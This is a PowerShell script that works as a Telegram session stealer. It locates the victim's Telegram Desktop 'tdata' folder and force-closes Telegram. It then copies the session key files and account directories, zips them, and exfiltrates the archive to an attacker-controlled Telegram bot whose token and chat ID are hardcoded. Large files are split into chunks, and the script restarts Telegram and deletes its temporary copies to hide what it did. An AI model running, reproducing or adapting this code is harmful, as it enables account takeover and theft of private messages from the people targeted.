param([string]$Token, [string]$ChatID)
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
if (-not $Token)  { $Token  = '9144321837:AAHrcLLsQqlZGQNXFdry99NnBKfTIHLCK90' }
if (-not $ChatID) { $ChatID = '1859879540' }

$apiDoc = "https://api.telegram.org/bot$Token/sendDocument"
$apiMsg = "https://api.telegram.org/bot$Token/sendMessage"
$curl   = (Get-Command curl.exe -ErrorAction SilentlyContinue).Source
$stamp  = Get-Date -Format 'yyyyMMdd_HHmmss'
$cap    = "$env:COMPUTERNAME | $env:USERNAME | $stamp"

function Send-Text([string]$text) {
    if ($curl) {
        & $curl -s --max-time 20 --data-urlencode "text=$text" -d "chat_id=$ChatID" $apiMsg | Out-Null
        return
    }
    try { Invoke-RestMethod -Method Post -Uri $apiMsg -Body @{ chat_id = $ChatID; text = $text } | Out-Null } catch {}
}

function Post([string]$file, [string]$text) {
    if ($curl) {
        $r = & $curl -s --max-time 600 -F "chat_id=$ChatID" -F "document=@$file" -F "caption=$text" $apiDoc
        if ($r -notmatch '"ok":true') { Send-Text ("part fail: " + $r + " | " + $text) }
        return
    }
    try {
        Add-Type -AssemblyName System.Net.Http
        $hc = New-Object System.Net.Http.HttpClient
        $hc.Timeout = [TimeSpan]::FromMinutes(10)
        $mp = New-Object System.Net.Http.MultipartFormDataContent
        $fs = [IO.File]::OpenRead($file)
        $sc = New-Object System.Net.Http.StreamContent($fs)
        $mp.Add($sc, 'document', [IO.Path]::GetFileName($file))
        $mp.Add((New-Object System.Net.Http.StringContent($text)), 'caption')
        $mp.Add((New-Object System.Net.Http.StringContent($ChatID)), 'chat_id')
        $resp = $hc.PostAsync($apiDoc, $mp).GetAwaiter().GetResult()
        $body = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()
        if ($body -notmatch '"ok":true') { Send-Text ("part fail: " + $body + " | " + $text) }
        $fs.Dispose(); $mp.Dispose(); $hc.Dispose()
    } catch { Send-Text ("part fail: " + $_.Exception.Message + " | " + $text) }
}

function Send-Large([string]$path, [string]$text) {
    if (-not (Test-Path $path)) { Send-Text "file missing: $text"; return }
    $limit = 45MB
    if ((Get-Item $path).Length -le $limit) { Post $path $text; return }
    $fs = [IO.File]::OpenRead($path); $i = 0
    try {
        while ($fs.Position -lt $fs.Length) {
            $part = "$path.part$i"
            $o2   = [IO.File]::Create($part)
            try {
                $left = $limit; $buf = New-Object byte[] (1MB)
                while ($left -gt 0 -and $fs.Position -lt $fs.Length) {
                    $n = $fs.Read($buf, 0, [Math]::Min($buf.Length, $left))
                    if ($n -le 0) { break }
                    $o2.Write($buf, 0, $n); $left -= $n
                }
            } finally { $o2.Close() }
            Post $part "$text [part $i]"
            Remove-Item $part -Force
            $i++
        }
    } finally { $fs.Close() }
}

Send-Text "start: $cap"

$cands = @()
$cands += Join-Path $env:APPDATA 'Telegram Desktop\tdata'
$cands += 'C:\Telegram\tdata'
$cands += Join-Path $env:USERPROFILE 'Downloads\Telegram\tdata'
$proc = Get-Process Telegram -ErrorAction SilentlyContinue | Select-Object -First 1
if ($proc -and $proc.Path) { $cands += Join-Path (Split-Path $proc.Path) 'tdata' }
Get-ChildItem (Join-Path $env:LOCALAPPDATA 'Packages') -Filter 'Telegram*' -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    $cands += Join-Path $_.FullName 'LocalCache\Roaming\Telegram Desktop\tdata'
}
$cands = $cands | Select-Object -Unique

$src = $cands | Where-Object { Test-Path (Join-Path $_ 'key_datas') } | Select-Object -First 1
if (-not $src) { Send-Text ("no tdata: $cap | checked " + $cands.Count + " paths"); exit }
Send-Text "found: $src"

$exe = Join-Path (Split-Path $src) 'Telegram.exe'

Stop-Process -Name Telegram -Force
$n = 0
while ((Get-Process Telegram -ErrorAction SilentlyContinue) -and $n -lt 15) {
    Start-Sleep -Milliseconds 1000
    $n++
}

$out = Join-Path $env:TEMP "td_$stamp"
$zip = "$out.zip"
New-Item -ItemType Directory $out -Force | Out-Null

# только нужное: файлы корня (key_datas, settingss, user_data#N, map*) + каталоги аккаунтов
Get-ChildItem $src -File -ErrorAction SilentlyContinue | Copy-Item -Destination $out -Force -ErrorAction SilentlyContinue
Get-ChildItem $src -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^[0-9A-Fa-f]{16}$' } | ForEach-Object {
    robocopy $_.FullName (Join-Path $out $_.Name) /E /XD cache /NFL /NDL /NJH /NJS /R:1 /W:1 | Out-Null
}

if (-not (Test-Path (Join-Path $out 'key_datas'))) {
    Send-Text "copy failed: $cap"
    if (Test-Path $exe) { Start-Process $exe }
    exit
}

$files = Get-ChildItem $out -Recurse -File -ErrorAction SilentlyContinue
$sz    = [Math]::Round((($files | Measure-Object Length -Sum).Sum)/1MB, 2)
Send-Text "copy ok: $cap | $($files.Count) files | $sz MB"

Add-Type -AssemblyName System.IO.Compression.FileSystem
Add-Type -AssemblyName System.IO.Compression
try {
    [IO.Compression.ZipFile]::CreateFromDirectory($out, $zip, [IO.Compression.CompressionLevel]::Fastest, $false)
} catch {
    Send-Text ("zip fail: " + $_.Exception.Message + " | $cap")
    if (Test-Path $exe) { Start-Process $exe }
    exit
}

if (Test-Path $zip) {
    Send-Large $zip "$cap | $([Math]::Round((Get-Item $zip).Length/1MB,2))MB"
} else {
    Send-Text "zip missing: $cap"
}

if (Test-Path $exe) { Start-Process $exe }
Remove-Item $out -Recurse -Force
Remove-Item $zip -Force
